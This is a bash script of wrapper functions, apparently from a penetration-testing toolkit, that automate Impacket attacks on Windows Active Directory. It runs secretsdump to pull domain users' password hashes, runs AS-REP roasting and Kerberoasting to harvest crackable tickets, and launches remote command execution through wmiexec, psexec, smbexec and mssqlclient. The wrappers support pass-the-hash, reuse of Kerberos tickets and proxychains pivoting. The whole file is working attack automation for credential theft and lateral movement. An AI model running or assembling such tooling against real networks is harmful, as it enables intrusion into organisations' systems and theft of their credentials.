#!/bin/bash

perform_impacket() {
    local impacket_command="$1"
    if [[ -z "$impacket_command" ]]; then
        echo "Impacket command must be specified."
        return 1
    fi
    local impacket_command_options=""
    if [[ ! -z "$2" ]]; then
        impacket_command_options="$2"
        echo "impacket_command_options=$impacket_command_options"
    fi
    local proxychain_command=""
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes"
    fi
    if [[ -z "$username" ]] ; then
        echo "Username must be set before running Kerberoast."
        return 1
    fi
    if [[ -z "$domain" ]] ; then
        echo "No domain was set. Make sure you are sure about this"
    fi
    if [[ -z "$target_ip" ]]; then
        echo "target_ip is not set" 
    fi
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running $impacket_command with proxychains"
    else
        proxychain_command=""
    fi
    if [[ ! -z "$dc_host" ]]; then
        impacket_command_options="$impacket_command_options -dc-host $dc_host"
    fi
    if [[ ! -z "$dc_ip" ]]; then
        impacket_command_options="$impacket_command_options -dc-ip $dc_ip"
    fi
    if [[ -z "$dc_host" ]] && [[ -z "$dc_ip" ]]; then
        echo "No DC host or IP specified. Make sure this is your intention." 
    fi
    local target=$username
    if [[ ! -z "$password" ]]; then
        target="$target:'$password'"
    fi
    if [[ ! -z "$domain" ]]; then
        target="$domain/$target"
    fi
    if [[ ! -z "$target_ip" ]]; then
        target="$target@$target_ip"        
    fi
    if [[ ! -z "$output_hashes" ]] && [[ "$output_hashes" == "true" ]]; then
        impacket_command_options="$impacket_command_options -outputfile $hash_file"
        if [[ -f "$hash_file" ]]; then
            echo "$hash_file already exists, skipping impacket"
            return 0
        fi
    fi
    local hashes_option="" 
    local kerberos_option=""
    if [[ ! -z "$KRB5CCNAME" ]]; then
        if [[ -f "$KRB5CCNAME" ]]; then
            echo "Using Kerberos ticket cache: $KRB5CCNAME"
            kerberos_option="-k"
        fi
    fi
    if [[ ! -z "$ntlm_hash" ]]; then
        if [[ $ntlm_hash == *":"* ]]; then
            hashes_option="-hashes $ntlm_hash"
        else
            hashes_option="-hashes "$(append_lm_hash $ntlm_hash)
        fi
        kerberos_option=""
    fi
    impacket_command_options="$impacket_command_options $hashes_option $kerberos_option"
    echo "going to set cmd options"
    local run_cmd_option=""    
    if [[ ! -z "$run_cmd" ]] && [[ "$run_cmd" == "true" ]]; then
        if [[ -z "$cmd" ]]; then
            echo "Command must be set when run_cmd is true."
        fi
        run_cmd_option="$cmd"
    fi
    echo "target=$target"
    echo ${proxychain_command}$impacket_command $impacket_command_options $target "$run_cmd_option"
    if [[ -z $run_cmd_option ]]; then
        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target | tee -a $trail_log
    else
        eval ${proxychain_command}$impacket_command $impacket_command_options -no-pass $target \"$run_cmd_option\" | tee -a $trail_log
    fi
}

perform_impacket_secretsdump () {

    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.secretsdump"
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running secretsdump."
        return 1
    fi
    output_hashes="true"
    perform_impacket "impacket-secretsdump" "-just-dc-user $target_username"

}


perform_impacket_wmiexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket WMICExec command."
        return 1
    fi
    if pgrep -f "wmiexec.py .*$target_ip"; then
        echo "Impacket WMIExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    perform_impacket "impacket-wmiexec" "$1"
}

perform_impacket_psexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket PsExec command."
        return 1
    fi
    if pgrep -f "psexec.py .*$target_ip"; then
        echo "Impacket PsExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    perform_impacket "impacket-psexec" "$1"
}

perform_impacket_smbexec() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
        return 1
    fi
    if pgrep -f "smbexec.py .*$target_ip"; then
        echo "Impacket SMBExec is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    perform_impacket "impacket-smbexec" "$1"
}

perform_impacket_mssqlclient() {
    if [[ -z "$username" ]] || [[ -z "$target_ip" ]]; then
        echo "Username, NTLM hash, and target IP address must be set before running Impacket SMBExec command."
        return 1
    fi
    if pgrep -f "mssqlclient.py .*$target_ip"; then
        echo "Impacket MSSQLClient is already running, please stop it first."
        return 0
    fi
    output_hashes="false"
    perform_impacket "impacket-mssqlclient" "$1"
}

perform_asrep_roasting() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.asreproast"
    fi
    output_hashes="true"
    perform_impacket "impacket-GetNPUsers" "-request $1"
}

perform_impacket_kerberoast() {
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.kerberoast"
    fi
    target_ip=
    output_hashes="true"
    perform_impacket "impacket-GetUserSPNs" "-request $1"
}

